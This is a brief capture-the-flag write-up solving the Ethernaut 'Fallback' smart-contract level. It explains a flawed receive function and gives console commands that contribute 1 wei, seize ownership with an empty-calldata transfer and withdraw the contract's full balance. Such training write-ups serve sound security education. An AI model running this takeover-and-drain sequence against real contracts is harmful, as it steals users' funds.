[1 - Fallback](https://ethernaut.openzeppelin.com/level/1)

Solution: 
* **receive** function is called when transaction's calldata is empty, and any ETH value is supplied.
* can take control of the contract by sending a transaction with empty calldata and 1 WEI
```
await contract.contribute({value: 1}); // to later on pass require in receive function
await contract.getContribution(); // to check contribution worked
await contract.send({value: 1}); // to hit receive function and change owner to ourselves
await getBalance(contract.address); // to check contract has balance
await contract.withdraw(); // to withdraw everything
await getBalance(contract.address); // to check solution is correct
```